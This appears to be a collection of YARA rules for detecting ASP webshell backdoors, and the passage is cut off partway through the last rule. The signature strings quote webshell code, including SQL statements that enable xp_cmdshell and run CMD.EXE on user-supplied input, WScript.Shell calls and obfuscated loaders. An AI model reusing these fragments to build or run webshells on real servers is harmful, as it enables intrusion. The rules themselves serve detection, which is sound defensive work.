rule _0d6e79458473ca80ccffede5496edebc0b60a7ad_9014671e691338e1b2f1656669e100388aa23fbb_a8dde654da009fcac59013b2f2394f1c548ba1ff__39
{
     meta:
        description = "asp - from files 0d6e79458473ca80ccffede5496edebc0b60a7ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
        hash2 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
        hash3 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
        hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
        hash5 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
        hash6 = "d1bc4c31bcdf5c0eb58207253fbaaa501ddaf5619b149f79dfbeb5f51c6ff3b0"
     strings:
        $x1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
        $x2 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $s3 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s4 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s5 = "Set XMatches = XregEx.Execute(filetxt)" fullword ascii
        $s6 = "Set Matches = regEx.Execute(filetxt)" fullword ascii
        $s7 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>" fullword ascii
        $s8 = "\",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>\"&replace(thePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1)&\"</a> \"" fullword ascii
        $s9 = "\",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>\"&replace(FilePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1)&\"</a><br />\"" fullword ascii
        $s10 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>WScr\"&DoMyBest&\"ipt.Shell " fullword ascii
        $s11 = "regEx.Pattern = \"Server.(Exec\"&\"ute|Transfer)([ \\t]*|\\()[^\"\"]\\)\"" fullword ascii
        $s12 = "regEx.Pattern = \"Server.(Exec\"&\"ute|Transfer)([ \\t]*|\\()\"\".*\"\"\"" fullword ascii
        $s13 = "tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, \"\"\"\") - srcSeek2 - i - 1)" fullword ascii
        $s14 = ",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>\"&replace(thePath,server.MapPath(\"\\\")&\"\\\",\"\",1,1,1)&\"</a>\"" fullword ascii
        $s15 = "If InStr(tmpName, \">\") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, \">\") - 1)" fullword ascii
        $s16 = "If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)" fullword ascii
        $s17 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Creat\"&\"eObject</td><td>Crea\"&\"teObject" fullword ascii
        $s18 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>.CreateTextFile|.OpenTextFile</td><td>" fullword ascii
        $s19 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(replace(replace(FilePath,server.MapPath" ascii
        $s20 = "temp = \"<a href=\"\"http://\"&Request.Servervariables(\"server_name\")&\"/\"&tURLEncode(Replace(replace(thePath,server.MapPath(" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _9014671e691338e1b2f1656669e100388aa23fbb_9c70ae294c771e4751da383cc8b8af736fc89447_a8dde654da009fcac59013b2f2394f1c548ba1ff__40
{
     meta:
        description = "asp - from files 9014671e691338e1b2f1656669e100388aa23fbb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
        hash2 = "3e2d04ccb6e5251902b4202c925e96eac23df35d0adeb5338af7a75b90efaaea"
        hash3 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
        hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
        hash5 = "ef3241f0ed93797881487fbc4e4da359687f896ef526980a1425fcd51d8519cc"
     strings:
        $s1 = ";srorrEllik=rorreno.wodniw};eurt nruter{)(srorrEllik noitcnuf>tpircsavaj=egaugnal tpircs<" fullword ascii
        $s2 = "= ]0[rtS;)21(yarrA wen = rtS};eslaf nruter{)0<i(fi{)i(rtSbDlluF noitcnuf" fullword ascii
        $s3 = "};)(timbus.mrofrdda.pot;redloF = eulav.htaPredloF.mrofrdda.pot{)redloF(redloFwohS noitcnuf" fullword ascii
        $s4 = "timbus" fullword ascii /* reversed goodware string 'submit' */
        $s5 = "= eulav.emaNF.mrofedih.pot{esle};)(timbus.mrofedih.pot;noitcAF = eulav.noitcA.mrofedih.pot{)llun=!emaND(fi};" fullword ascii
        $s6 = "=LMTHrenni.cba;gp = eulav.egaP.mroFbD;rts = eulav.rtSlqS.mroFbD};eslaf nruter;)" fullword ascii
        $s7 = "SROSSECORP_FO_REBMUN" fullword ascii /* reversed goodware string 'NUMBER_OF_PROCESSORS' */
        $s8 = ">dt/<;psbn&>" fullword ascii /* reversed goodware string '>&nbsp;</td>' */
        $s9 = "=+ eulav.emaNF.mrofedih.pot;)emaNF," fullword ascii
        $s10 = ";xp21:ezis-tnof" fullword ascii /* reversed goodware string 'font-size:12px;' */
        $s11 = "(tuoemiTtes" fullword ascii /* reversed goodware string 'setTimeout(' */
        $s12 = ";)(timbus.nusdlog.lla.tnemucod" fullword ascii
        $s13 = "EMAN_REVRES" fullword ascii /* reversed goodware string 'SERVER_NAME' */
        $s14 = "OFNI_HTAP" fullword ascii /* reversed goodware string 'PATH_INFO' */
        $s15 = "=sutats.wodniw;)(gnirtSelacoLot.yadot =yalpsid rav;)(etaD wen = yadot rav;)001 ," fullword ascii
        $s16 = "};eurt nruter};]i[rtS = eulav.rtSlqS.mroFbD{esle};)]i[rtS(trela{)21==i(fi esle};" fullword ascii
        $s17 = ">dt/<>" fullword ascii /* reversed goodware string '></td>' */
        $s18 = "FFFFFF#" fullword ascii /* reversed goodware string '#FFFFFF' */
        $s19 = "};eurt nruter};eslaf nruter;)0(rtSbDlluF;)" fullword ascii
        $s20 = "= emaND{esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF," fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _1687747b3f79f880735ae0f762baa52b03a96c36_732bb60287fd6e3d82ab9dba919aa2a92cea20a7_8266d76ec5105abfe09bb52229370625fa535e47__41
{
     meta:
        description = "asp - from files 1687747b3f79f880735ae0f762baa52b03a96c36.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
        hash2 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
        hash3 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
        hash4 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
        hash5 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
        hash6 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
        hash7 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
        hash8 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $x1 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s2 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s3 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s4 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml" ascii
        $s5 = "& 001 / )001 * ))4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( < eziSeht dnA )4201 * 4201( => eziSeht fI:" fullword ascii
        $s6 = "& 001 / )001 * ))4201 * 4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( => eziSeht fI:)eziSeht(eziSehTteg n" fullword ascii
        $s7 = "& 001 / )001 * )4201 / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201( < eziSeht dnA 4201 => eziSeht fI:fi dne:" fullword ascii
        $s8 = "str1=\"\"&Request.ServerVariables(\"SERVER_Name\"):BackUrl=\"<br><br><center><a href='javascript:history.back()'>" fullword ascii
        $s9 = "& eltiTrts = eltiTrts:eltiTrts miD:)htaPrewoP,enOeht(eltiTyMteg noitcnuF:bus dne:gnihtoN = eliFeht teS:)htaPrewoP,eliFeht(eltiT" fullword ascii
        $s10 = "taPrewoP,eulaVtni(setubirttAteg noitcnuF:noitcnuF dnE:eltiTrts = eltiTyMteg:)htaPrewoP,setubirttA.enOeht(setubirttAteg & " fullword ascii
        $s11 = "response.Redirect \"http://\"&serveru&\"/global.asa\"" fullword ascii
        $s12 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'redavni'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s13 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'1'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s14 = "(htaPpaM.revreS = htaPeht:htaPeht ,lrUeht miD:)htaPesu(lrUnepo noitcnuf:noitcnuF dnE:fi dne:" fullword ascii
        $s15 = "execute(shisanfun(\"gnihton = mso tes" fullword ascii
        $s16 = "execute(shisanfun(\"rtSrWeR = rWeRcS" fullword ascii
        $s17 = "j:23=setubirttA.eliFeht:neht 1=epyTevaS fi:)htaPrewoP(eliFteG.Xosf = eliFeht teS:)epyTevaS,htaPrewoP(rewoPevaS bus" fullword ascii
        $s18 = "ExeCuTe(ShiSanFun(ShiSan)) " fullword ascii
        $s19 = "execute(shisanfun(\"buS dnE" fullword ascii
        $s20 = "execute(shisanfun(\"fi dne" fullword ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _037752fdd098a42e25c4b2c9960d18dd214aa3f6_6684959e4d40495d462b1782602eb5840b56f4de_875fcea5476b4e35f5c47a22edbe51940d44c200__42
{
     meta:
        description = "asp - from files 037752fdd098a42e25c4b2c9960d18dd214aa3f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d046439732109dd70ca88b040223f9eebd55bc523d62ac85381a95176714a14"
        hash2 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
        hash3 = "b0949198eab2be841241983d0a9a55973cacdf113928e61cb7d42dc3247dc462"
        hash4 = "91bb468add2687a86069b70f8fd419f5cb290b63c9d99da967243468f0a3dceb"
     strings:
        $s1 = "o do Command: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
        $s2 = "Response.Write \"<b>Arquitetura do Processador: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
        $s3 = "Response.Write \"<b>Identificador do Processador: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
        $s4 = "Response.Write \"<b>Nome do Computador: </b>\" & WshNetwork.ComputerName & \"<br>\"" fullword ascii
        $s5 = "strRawKey = Right(strCryptString, Len(strCryptString) - InStr(strCryptString, \"|\"))" fullword ascii
        $s6 = "Response.Write \"Valor: <b>\" & WshShell.RegRead (Trim(Request.QueryString(\"key\")))" fullword ascii
        $s7 = "intKey = HexConv(Left(strRawKey, InStr(strRawKey, \"|\") - 1)) - HexConv(intOffSet)" fullword ascii
        $s8 = "strHexCrypData = Left(strCryptString, Len(strCryptString) - (Len(strRawKey) + 1))" fullword ascii
        $s9 = "vel (ex. \"\"%windir%\\\\calc.exe\"\") </td><td><font face=\"\"arial\"\" size=\"\"1\"\"> string </td></tr>\"" fullword ascii
        $s10 = "mero de Processadores: </b>\" & WshEnv(\"NUMBER_OF_PROCESSORS\") & \"<br>\"" fullword ascii
        $s11 = "Response.Write \"<tr><td\" & corfundotabela & \"><font face='arial' size='2'>:: \" & showobj(FilesItem0.path) & \"</td><td valig" ascii
        $s12 = "intOffSet = Right(strRawKey, Len(strRawKey) - InStr(strRawKey,\"|\"))" fullword ascii
        $s13 = "vel do Processador: </b>\" & WshEnv(\"PROCESSOR_LEVEL\") & \"<br>\"" fullword ascii
        $s14 = "Response.Write \"<b>Caminho do System32: </b>\" & WshShell.CurrentDirectory & \"<br>\"" fullword ascii
        $s15 = "o do Processador: </b>\" & WshEnv(\"PROCESSOR_REVISION\") & \"<br>\"" fullword ascii
        $s16 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javascript:document.open('\" & Request.ServerVariable" ascii
        $s17 = "rio escolhido (mais demorado). O tempo do deface vai variar de acordo com o numero TOTAL de diret" fullword ascii
        $s18 = "Response.Write \"<tr><td><font face=\"\"arial\"\" size=\"\"1\"\">REG_DWORD </td><td><font face=\"\"arial\"\" size=\"\"1\"\"> n" fullword ascii
        $s19 = "Response.Write \"<b>Execut" fullword ascii
        $s20 = "Response.Write \"<font face='arial' size='2'><center><br><br>Arquivo: <b>\" & arquivo & \"</b><br>copiado para: <b>\" & destino" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _43328c78e906cddc813382f26f0176a96568cde3_73d1d98465e4119ddd41512b3be7afca04c105b5_9885ee1952b5ad9f84176c9570ad4f0e32461c92__43
{
     meta:
        description = "asp - from files 43328c78e906cddc813382f26f0176a96568cde3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ac32432ae9ce015add0335d9f1fa08f198193d545f4efccd20965288af14663b"
        hash2 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
        hash3 = "4bcf28a1f9dc2b63bc55da432f71c5d9a04a35a34b8c04d73115ffe092fa310b"
        hash4 = "a2f59afbb8ec963f945c8945ae37f6302059f94f7688745a22b17c7193414ab0"
     strings:
        $s1 = "P'P@#@&W;x1YbWUP!nDs;V^KlDtc2mYtb@#@&d!+Do!VshlDtP{PaCY4@#@&db0~]botDcwmYtBqbP@!@*,JwJ~O4+UPVnYwEsshlY4~{P2lD4LJwrPE" fullword ascii
        $s2 = "W'ELl7CdmMkaYltrdDW.Xc8l13cbE@*@!8.@*[U4k2pJE,[,2DMRGn/1DrwDkGU,[PrE@!Jl@*@!8.@*rJ=2.D /^+CD=]+kwGUk+Ros!/4)AU9P(6)" fullword ascii
        $s3 = "@!z0KUO@*YJLfrDjOM[EP]@!0KxO~1WVG.{DnN@*EL2.MRG+/1Db2YbWU[r@!&WKxY@*D@!(D@*r@#@&d" fullword ascii
        $s4 = "mDcZ}1jK|sj6*@#@&knY,0P{~W/KRT+O0Gs9+.`hCY4#@#@&@#@&@#@&@#@&kWPv/4+^0sbV+{KM;+*PCx9Pc(U{KA\\n|fq\"xWl^/" fullword ascii
        $s5 = "T@!0GxDP^G^WD{.+9@*JLKCY4[r@!&0GUD@*@!4M@*J@#@&77i4PxOMEn@#@&7idnXkDP0!x1OkKx@#@&idnsk+@#@&7diI+k2Gxk+c" fullword ascii
        $s6 = "PH+XY@#@&,?+D~W(LsU6~',ZM+CYn6(LnmDcZ}1jP|s?6b,@#@&P,r6PG(Lw?rcsbs+A6r/D/cWbV+aCY4#PD4nx,B" fullword ascii
        $s7 = "DPx~:D;+@#@&U+.7+MR?1Db2Y:kh+}EOxO,,O1,O,,@#@&~P@#@&;rH?Pmw?6'rjmMk2Or[JrUTRok^ELJnUXkYJLJ" fullword ascii
        $s8 = "@#@&iBx'{x{'x{'{''{'{x'{'x'{'xx{''{x'{''{xx'{'{'x'xx{'x'{x'{'xx{''xx{'x'{x{'x{'{@#@&id\"nP{P/t" fullword ascii
        $s9 = "xN,rWd@#@&iBx'xx{'x'{x'{'xx{''xx{'x'{x{'x{'{''{'{x'{'x'{'xx{''{x'{''{xx'{'{'x'xx{'x'{xd@#@&7n" fullword ascii
        $s10 = "@!JWKxO@*Tr[nmY4'J,$@!0KxO~1WVK.'M+N@*E'2MDcfn/^.bwOkKU[r@!&WKxY@*D@!4.@*r7id7id@#@&did" fullword ascii
        $s11 = "6O@#@&v{'x{'{''{'{x'{'x'{'xx{''{x'{''{xx'{'{'@#@&jnDPo?}~',1GO4kxL@#@&/nY,W,'~gWDtk" fullword ascii
        $s12 = "@#@&Ex{'x{'{''{'{x'{'x'{'xx{''{x'{''{xx'{'{@#@&+U[,kW@#@&@#@&@#@&@#@&E''xx{'x'{x{'x," fullword ascii
        $s13 = ".bYn`GrM?OM#@#@&d}x,3DMW.P\"+d;s+Pgn6D@#@&ijnY,sUr~'~j" fullword ascii
        $s14 = "@#@&4{Wl^/n@#@&B'xx{'x'{x{'x{'{''{'{x'{'x'{'xx{''{x'{'@#@&WGD,+mm4PWr^+~k" fullword ascii
        $s15 = "N~kW@#@&+UN,r0@#@&7@#@&dkW~vZ4+1Vg+aDfbD':D!n#,lUN,`(j|K2tK{GqI{WCVk+*POtnU,B" fullword ascii
        $s16 = "D7+DcZMnlD+64N+^OvZrgjK|s?}b@#@&iA,'~sj6csGV9nDA6rdD/`KCDtb@#@&7k+O,sUr'" fullword ascii
        $s17 = "@!zm@*@!zDN@*@!JYD@*E@#@&IIUE@!YM@*@!Y[P4nbo4Y{v 8B@*@!mPt.n6'vgz^DkG" fullword ascii
        $s18 = "/2Kxk+RSDbO+,JE_74/.d0_rE_74ZMJW_rJ@#@&@#@&]nkwGxknR~EWW" fullword ascii
        $s19 = "MkOn,JP,@!K\"@*J@#@&]+kwKxd+ " fullword ascii
        $s20 = "/YvEb1YkKUE#=nK/x @#@&\"WGYhCY4'jnM\\+. tl2nmO4`EcJ*@#@&q" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _0d6e79458473ca80ccffede5496edebc0b60a7ad_21fd0ada0d0c86b6899d5b7af4b55e72884a5513_9bac59023b27a7ce066f2c4e7d3c1b1df9d5133f__44
{
     meta:
        description = "asp - from files 0d6e79458473ca80ccffede5496edebc0b60a7ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
        hash2 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
        hash3 = "39e42a7d88da56b57f095012aa94590ece4ee28b01984abbe366a52434f4c38c"
        hash4 = "fbfdd9aca6c7ddb7c2ed97f1852f1b9896a6149874c5b4163186fb71a32ded2f"
        hash5 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
     strings:
        $x1 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
        $s2 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s3 = "CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
        $s4 = "STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SANDBOXMOD" ascii
        $s5 = "STRQUERY = \"EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';\"" fullword ascii
        $s6 = "STRQUERY=\"SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_CMDSHELL'\"" fullword ascii
        $s7 = "STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C DEL " ascii
        $s8 = "STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT" ascii
        $s9 = "PATH=\"C:\\WINNT\\SYSTEM32\\IAS\\IAS.MDB\"" fullword ascii
        $s10 = "STRQUERY=\"SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_SERVICECONTROL'\"" fullword ascii
        $s11 = "PATH=\"C:\\WINDOWS\\SYSTEM32\\IAS\\IAS.MDB\"" fullword ascii
        $s12 = "RESPONSE.WRITE \"<INPUT NAME=PASS TYPE=PASSWORD ID=PASS VALUE=\"&SESSION(\"PASS\")&\">\"" fullword ascii
        $s13 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('SP_OACREATE','ODSOLE70.DLL')\"" fullword ascii
        $s14 = "RESPONSE.WRITE \"<INPUT NAME=PORT TYPE=TEXT ID=SERVER VALUE=127.0.0.1>\"" fullword ascii
        $s15 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_REGWRITE','XPSTAR.DLL')\"" fullword ascii
        $s16 = "RESPONSE.WRITE \"<FORM NAME=FORM1 METHOD=POST SQLAAA=\"&REQUEST.SERVERVARIABLES(\"URL\")&\">\"" fullword ascii
        $s17 = "STRQUERY=\"SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='SP_OACREATE'\"" fullword ascii
        $s18 = "STRQUERY=\"SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_REGWRITE'\"" fullword ascii
        $s19 = "Response.AddHeader \"Content-Length\", OSM.Size" fullword ascii
        $s20 = "STRQUERY = \"CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOF" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0d6e79458473ca80ccffede5496edebc0b60a7ad_9014671e691338e1b2f1656669e100388aa23fbb_a8dde654da009fcac59013b2f2394f1c548ba1ff__45
{
     meta:
        description = "asp - from files 0d6e79458473ca80ccffede5496edebc0b60a7ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
        hash2 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
        hash3 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
        hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
        hash5 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s2 = "C.CompactDatabase \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\"&Path&\",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" &P" fullword ascii
        $s3 = "SI=SI&\"<td height='30'><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DownFile\"\");' title='" fullword ascii
        $s4 = "RRS \"<form action=\"\"?Action=kmuma&act=scan\"\" method=\"\"post\"\" name=\"\"form1\"\">\"" fullword ascii
        $s5 = "RRS \"<input name=\"\"path\"\" type=\"\"text\"\" style=\"\"border:1px solid #999\"\" value=\"\".\"\" size=\"\"30\"\" /> " fullword ascii
        $s6 = "<input name=\"\"Search_FileExt\"\" type=\"\"text\"\" style=\"\"border:1px solid #999\"\" value=\"\"*\"\" size=\"\"20\"\"> " fullword ascii
        $s7 = "fsoX.CreateFolder(Left(thePath, i - 1))" fullword ascii
        $s8 = "If request.Form(\"path\") = \"\" or request.Form(\"Search_Date\") = \"\" or request.Form(\"Search_FileExt\") = \"\" Then" fullword ascii
        $s9 = "RRS \"<div id=\"\"updateInfo\"\" style=\"\"background:ffffe1;border:1px solid #89441f;padding:4px;display:none\"\"></div>\"" fullword ascii
        $s10 = "RRS\"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"\"&D.DriveLetter&\":\\\\\"\")'>" fullword ascii
        $s11 = "SI=SI&\"<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&i&\")'>\"&i&\"</a>&nbsp;\"" fullword ascii
        $s12 = "RRS \"<table width=\"\"100%\"\" border=\"\"0\"\" cellpadding=\"\"0\"\" cellspacing=\"\"0\"\" style='font-size:12px'>\"" fullword ascii
        $s13 = "<a href=\"\"#\"\" onClick=\"\"javascript:form1.Search_Date.value='ALL'\"\">ALL</a><br />\"" fullword ascii
        $s14 = "Server.ScriptTimeout=1000000 " fullword ascii
        $s15 = "RRS\".cmd{background-color:#000;color:#FFF}\"" fullword ascii
        $s16 = "SI=SI&\"&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&Page+1&\")'>" fullword ascii
        $s17 = "SI=SI&\"&nbsp;&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",1)'>" fullword ascii
        $s18 = "</a>&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&Page-1&\")'>" fullword ascii
        $s19 = "</a>&nbsp;<a href='javascript:FullSqlStr(\"\"\"&SqlStr&\"\"\",\"&PN&\")'>" fullword ascii
        $s20 = "RRS \"<input name=thePath value=\"\"\" & HtmlEncode(Server.MapPath(\".\")) & \"\"\" size=80>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _42ca332dbe4463b083d24bd019115a00db413c2b_970264364422b3d34bd008e02d794baf3df62b00_cd14346f158a616ca9a79edf07e3eb3acc84afae__46
{
     meta:
        description = "asp - from files 42ca332dbe4463b083d24bd019115a00db413c2b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bc041032ed36879be7e068d17db8fdbe4c251596276fba1cc4f8ac8efa2bae34"
        hash2 = "7580a31513ba4719a1eb7fd037b7d8b1ec13077605936d8e1b87965c3429010e"
        hash3 = "ce13b9dcf134bea0a6766c65f8229455bbe3fabae225018fcf252f091aefb019"
        hash4 = "46487a3f8ee782d4cc95b98f5f7ebef6d8de4f0858cf33cd700d576a4b770251"
        hash5 = "65dbdb94717f956d1529eae468447f65f95a91f16019173aa740894845abc1d3"
        hash6 = "4334d3b9d075e530187d23cd7f8f067de67c3a94e6888335d8b0d4c9ca4a9187"
        hash7 = "7f4139601930bba578adbd3f152397f7396688744df2b231b2fcaa90e36a995f"
     strings:
        $s1 = "\" then: tmp = Mid(bb, i, 1) + tmp:else:tmp=vbcrlf&tmp:end if:next:Unlin=tmp:end function:  Case \"ReadREG\":call ReadREG():Case" ascii
        $s2 = "jb \" method=Post>                  \":jb \"        <TD align=middle><B>System32" fullword ascii
        $s3 = "C:\\ASP\\\":jb \"  </FORM>\":jb \"<DIV>\":Set FSO=Nothing:End Sub:Sub ScanDrive(Drive):Dim FSO,TestDrive,BaseFolder,TempFolders," ascii
        $s4 = "C:\\ASP\\\":jb \"  </FORM>\":jb \"<DIV>\":Set FSO=Nothing:End Sub:Sub ScanDrive(Drive):Dim FSO,TestDrive,BaseFolder,TempFolders," ascii
        $s5 = "ve&Drive=\":jb  DriveB.DriveLetter:jb \" method=Post>\":jb \"<TD width=25\"&chr(37)&\"><B>" fullword ascii
        $s6 = "si=si&\"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option v" fullword ascii
